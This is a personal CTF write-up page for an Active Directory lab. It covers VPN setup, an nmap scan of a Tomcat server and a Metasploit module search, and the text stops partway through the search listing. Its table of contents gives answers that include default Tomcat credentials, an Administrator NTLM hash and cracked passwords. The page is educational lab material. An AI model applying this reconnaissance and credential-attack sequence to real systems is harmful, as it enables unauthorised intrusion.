@@ -1,0 +1,1520 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.6">
+    
+    
+      
+        <title>CTF Round 3 - Active Directory - Ahmad A'fif</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6910b76c.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.196e0c26.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#challenges-vpn" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../../.." title="Ahmad A&#39;fif" class="md-header-nav__button md-logo" aria-label="Ahmad A'fif">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            Ahmad A'fif
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              CTF Round 3 - Active Directory
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Ahmad A&#39;fif" class="md-nav__button md-logo" aria-label="Ahmad A'fif">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Ahmad A'fif
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    <label class="md-nav__link" for="nav-2">
+      Writeup
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Writeup" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
+    <label class="md-nav__link" for="nav-2-1">
+      CTF Intern
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="CTF Intern" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        CTF Intern
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        CTF Round 3 - Active Directory
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      CTF Round 3 - Active Directory
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-vpn" class="md-nav__link">
+    Challenges - VPN
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - VPN">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-vpn-configuration" class="md-nav__link">
+    Q1 - VPN configuration
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - VPN configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-178xxxxxx221udp11139" class="md-nav__link">
+    Answer: 178.XXX.XXX.221:udp:11139
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-vpn-user-network-address" class="md-nav__link">
+    Q2 - VPN user network address
+  </a>
+  
+    <nav class="md-nav" aria-label="Q2 - VPN user network address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-1002000" class="md-nav__link">
+    Answer: 10.0.200.0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-challenge-server-network-address" class="md-nav__link">
+    Q3 - Challenge server network address
+  </a>
+  
+    <nav class="md-nav" aria-label="Q3 - Challenge server network address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-1921682400" class="md-nav__link">
+    Answer: 192.168.240.0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-web-server" class="md-nav__link">
+    Challenges - Web Server
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - Web Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-username-and-password-for-webserver-cat-with-name-tom" class="md-nav__link">
+    Q1 - Username and password for webserver 'cat' with name 'tom'.
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - Username and password for webserver 'cat' with name 'tom'.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-admintomcat" class="md-nav__link">
+    Answer: admin:tomcat
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-md5-checksum-hash-for-file-tomcatico" class="md-nav__link">
+    Q2 - MD5 checksum hash for file 'tomcat.ico'
+  </a>
+  
+    <nav class="md-nav" aria-label="Q2 - MD5 checksum hash for file 'tomcat.ico'">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-4644f2d45601037b8423d45e13194c93" class="md-nav__link">
+    Answer: 4644f2d45601037b8423d45e13194c93
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-plain-text-password-for-domain-user" class="md-nav__link">
+    Q3 - Plain text password for domain user
+  </a>
+  
+    <nav class="md-nav" aria-label="Q3 - Plain text password for domain user">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-pssw0rd123" class="md-nav__link">
+    Answer: P@ssw0rd123!
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q4-ntlm-hash-result-for-user-administrator" class="md-nav__link">
+    Q4 - NTLM hash result for user Administrator
+  </a>
+  
+    <nav class="md-nav" aria-label="Q4 - NTLM hash result for user Administrator">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-administrator500aad3b435b51404eeaad3b435b51404eee19ccf75ee54e06b06a5907af13cef42" class="md-nav__link">
+    Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q5-plain-text-password-for-user-administrator" class="md-nav__link">
+    Q5 - Plain text password for user Administrator
+  </a>
+  
+    <nav class="md-nav" aria-label="Q5 - Plain text password for user Administrator">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-pssw0rd" class="md-nav__link">
+    Answer: P@ssw0rd
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q6-domain-user" class="md-nav__link">
+    Q6 - Domain User
+  </a>
+  
+    <nav class="md-nav" aria-label="Q6 - Domain User">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-ali" class="md-nav__link">
+    Answer: ali
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q7-domain-admin" class="md-nav__link">
+    Q7 - Domain Admin
+  </a>
+  
+    <nav class="md-nav" aria-label="Q7 - Domain Admin">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-abuumar" class="md-nav__link">
+    Answer: abu:umar
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q8-enterprise-admins" class="md-nav__link">
+    Q8 - Enterprise Admins
+  </a>
+  
+    <nav class="md-nav" aria-label="Q8 - Enterprise Admins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-abu" class="md-nav__link">
+    Answer: abu
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-file-server" class="md-nav__link">
+    Challenges - File Server
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - File Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-ip-address-of-file-server" class="md-nav__link">
+    Q1 - IP address of file server
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - IP address of file server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-19216824013" class="md-nav__link">
+    Answer: 192.168.240.13
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-folder-share-name-that-domain-user-has-write-access-to-file-server" class="md-nav__link">
+    Q2 - Folder share name that 'domain user' has write access to file server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-ntlm-hash-result-for-user-administrator" class="md-nav__link">
+    Q3 - NTLM hash result for user Administrator
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q4-ntlm-hash-result-for-user-mar" class="md-nav__link">
+    Q4 - NTLM hash result for user "*mar"
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q5-plain-text-password-for-user-administrator_1" class="md-nav__link">
+    Q5 - Plain text password for user Administrator
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-vpn" class="md-nav__link">
+    Challenges - VPN
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - VPN">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-vpn-configuration" class="md-nav__link">
+    Q1 - VPN configuration
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - VPN configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-178xxxxxx221udp11139" class="md-nav__link">
+    Answer: 178.XXX.XXX.221:udp:11139
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-vpn-user-network-address" class="md-nav__link">
+    Q2 - VPN user network address
+  </a>
+  
+    <nav class="md-nav" aria-label="Q2 - VPN user network address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-1002000" class="md-nav__link">
+    Answer: 10.0.200.0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-challenge-server-network-address" class="md-nav__link">
+    Q3 - Challenge server network address
+  </a>
+  
+    <nav class="md-nav" aria-label="Q3 - Challenge server network address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-1921682400" class="md-nav__link">
+    Answer: 192.168.240.0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-web-server" class="md-nav__link">
+    Challenges - Web Server
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - Web Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-username-and-password-for-webserver-cat-with-name-tom" class="md-nav__link">
+    Q1 - Username and password for webserver 'cat' with name 'tom'.
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - Username and password for webserver 'cat' with name 'tom'.">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-admintomcat" class="md-nav__link">
+    Answer: admin:tomcat
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-md5-checksum-hash-for-file-tomcatico" class="md-nav__link">
+    Q2 - MD5 checksum hash for file 'tomcat.ico'
+  </a>
+  
+    <nav class="md-nav" aria-label="Q2 - MD5 checksum hash for file 'tomcat.ico'">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-4644f2d45601037b8423d45e13194c93" class="md-nav__link">
+    Answer: 4644f2d45601037b8423d45e13194c93
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-plain-text-password-for-domain-user" class="md-nav__link">
+    Q3 - Plain text password for domain user
+  </a>
+  
+    <nav class="md-nav" aria-label="Q3 - Plain text password for domain user">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-pssw0rd123" class="md-nav__link">
+    Answer: P@ssw0rd123!
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q4-ntlm-hash-result-for-user-administrator" class="md-nav__link">
+    Q4 - NTLM hash result for user Administrator
+  </a>
+  
+    <nav class="md-nav" aria-label="Q4 - NTLM hash result for user Administrator">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-administrator500aad3b435b51404eeaad3b435b51404eee19ccf75ee54e06b06a5907af13cef42" class="md-nav__link">
+    Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q5-plain-text-password-for-user-administrator" class="md-nav__link">
+    Q5 - Plain text password for user Administrator
+  </a>
+  
+    <nav class="md-nav" aria-label="Q5 - Plain text password for user Administrator">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-pssw0rd" class="md-nav__link">
+    Answer: P@ssw0rd
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q6-domain-user" class="md-nav__link">
+    Q6 - Domain User
+  </a>
+  
+    <nav class="md-nav" aria-label="Q6 - Domain User">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-ali" class="md-nav__link">
+    Answer: ali
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q7-domain-admin" class="md-nav__link">
+    Q7 - Domain Admin
+  </a>
+  
+    <nav class="md-nav" aria-label="Q7 - Domain Admin">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-abuumar" class="md-nav__link">
+    Answer: abu:umar
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q8-enterprise-admins" class="md-nav__link">
+    Q8 - Enterprise Admins
+  </a>
+  
+    <nav class="md-nav" aria-label="Q8 - Enterprise Admins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-abu" class="md-nav__link">
+    Answer: abu
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenges-file-server" class="md-nav__link">
+    Challenges - File Server
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenges - File Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-ip-address-of-file-server" class="md-nav__link">
+    Q1 - IP address of file server
+  </a>
+  
+    <nav class="md-nav" aria-label="Q1 - IP address of file server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#answer-19216824013" class="md-nav__link">
+    Answer: 192.168.240.13
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-folder-share-name-that-domain-user-has-write-access-to-file-server" class="md-nav__link">
+    Q2 - Folder share name that 'domain user' has write access to file server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-ntlm-hash-result-for-user-administrator" class="md-nav__link">
+    Q3 - NTLM hash result for user Administrator
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q4-ntlm-hash-result-for-user-mar" class="md-nav__link">
+    Q4 - NTLM hash result for user "*mar"
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q5-plain-text-password-for-user-administrator_1" class="md-nav__link">
+    Q5 - Plain text password for user Administrator
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>CTF Round 3 - Active Directory</h1>
+                
+                <p><img alt="" src="/images/ctf-round-3-active-directory/1.png" /></p>
+<p>This is a writeup for CTF Round 3 - Active Directory. In this CTF, there are 4 challenges which are VPN, web server, file server and Domain Controller. Some of the challenges are hard and need to go for experimenting and reading through previous writeup and might find some ideas from there.  </p>
+<blockquote>
+<p>Note that some of the informations are confidential, therefore I changed a little bit.  </p>
+</blockquote>
+<h2 id="challenges-vpn">Challenges - VPN</h2>
+<p>Each of the participant given own unique vpn config file. Answer for this challenge is based on the vpn config file.</p>
+<h3 id="q1-vpn-configuration">Q1 - VPN configuration</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/2.png" /></p>
+<p>Question 1 asking for information about VPN server public ip. Hint said this can be found in the VPN config file. So, I open the config file using my favourite code editor.</p>
+<pre><code>remote vpn.ctf.xxxxxxxxxx.com 11139 udp
+</code></pre>
+<p>While scrolling, I found this line of config included host name, port number and protocol. I copied the host name and ran into <a href="https://www.ultratools.com/tools/ipWhoisLookup">WHOIS IP Lookup Tool</a>. Found the IP address 178.XXX.XXX.221.</p>
+<h4 id="answer-178xxxxxx221udp11139">Answer: 178.XXX.XXX.221:udp:11139</h4>
+<h3 id="q2-vpn-user-network-address">Q2 - VPN user network address</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/3.png" /></p>
+<p>Question 2 asked for the user network address. To achieve that, I need to connect to the VPN. I ran <code>sudo openvpn vpn_conect.config</code>. Once connection initialized, I ran <code>ifconfig</code> and look for interface name like <strong>tunXX</strong>. There is the user IP address at the interface. Note that network address is like <strong>10.XXX.XXX.0</strong>. Simply changed it.</p>
+<h4 id="answer-1002000">Answer: 10.0.200.0</h4>
+<h3 id="q3-challenge-server-network-address">Q3 - Challenge server network address</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/4.png" /></p>
+<p>Question 3 asked for the server network address. Hint said I need to use command <code>netstat -rn</code>. I ran the command and get this output.</p>
+<pre><code>$ netstat -rn
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         192.168.1.1     0.0.0.0         UG        0 0          0 eth0
+10.0.200.0      0.0.0.0         255.255.255.0   U         0 0          0 tun0
+192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 eth0
+192.168.9.0     10.0.200.1      255.255.255.0   UG        0 0          0 tun0
+192.168.240.0   10.0.200.1      255.255.255.0   UG        0 0          0 tun0
+</code></pre>
+<p>On interface <strong>tun0</strong>, there are 2 network address, <strong>192.168.9.0</strong> and <strong>192.168.240.0</strong> that have flag <strong>UG</strong>. This flag means that the route is up and point to a gateway. Both address point to <strong>10.0.200.1</strong> which is the gateway. I tested both network address and got the right answer.</p>
+<h4 id="answer-1921682400">Answer: 192.168.240.0</h4>
+<h2 id="challenges-web-server">Challenges - Web Server</h2>
+<p>To answer this challenge, I need to know the IP address of the web server. I went through the question and found hint on <strong>question 6</strong> which stated the ip address <strong>192.168.240.80</strong>. I ran <code>nmap -Pn -A 192.168.240.80</code> and got something.</p>
+<pre><code>$ nmap -Pn -A 192.168.9.0/24
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 23:50 +08
+Nmap scan report for 192.168.240.80
+Host is up (0.16s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE VERSION
+80/tcp   closed http
+443/tcp  closed https
+8080/tcp open   http    Apache Tomcat 8.5.59
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/8.5.59
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds
+</code></pre>
+<p><strong>nmap</strong> discovered 3 ports on <strong>192.168.240.80</strong> and only 1 port is open, port <strong>8080</strong> -&gt; Apache Tomcat.</p>
+<h3 id="q1-username-and-password-for-webserver-cat-with-name-tom">Q1 - Username and password for webserver 'cat' with name 'tom'.</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/5.png" /></p>
+<p>I ran <code>msfconsole</code> and search for specific modules about the Apache Tomcat by using command <code>search tomcat</code>.</p>
+<pre><code>msf6 &gt; search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
+   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
+   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
+   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
+   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
